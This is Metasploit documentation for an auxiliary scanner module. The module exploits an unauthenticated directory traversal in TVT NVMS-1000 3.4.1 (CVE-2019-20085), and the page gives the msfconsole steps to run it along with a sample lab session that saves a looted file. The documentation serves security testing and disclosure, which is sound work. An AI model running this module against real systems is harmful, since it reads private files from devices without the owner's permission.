## Description

This module exploits an unauthenticated directory traversal vulnerability which exists in TVT network surveillance management software-1000 version 3.4.1. NVMS listens by default on port 80.

### Vulnerable Application

* http://en.tvt.net.cn/upload/service/NVMS1000.zip

## Verification

1. `./msfconsole`
2. `use auxiliary/scanner/http/tvt_nvms_traversal`
3. `set rhosts <rhost>`
4. `run`

## Scenarios

### Tested against Windows 7 SP1

```
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 192.168.43.152
RHOSTS => 192.168.43.152
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] File saved in: /root/.msf4/loot/20191230124941_default_192.168.43.152_nvms.traversal_240600.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/tvt_nvms_traversal) >
```

## References

* https://www.exploit-db.com/exploits/47774
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20085
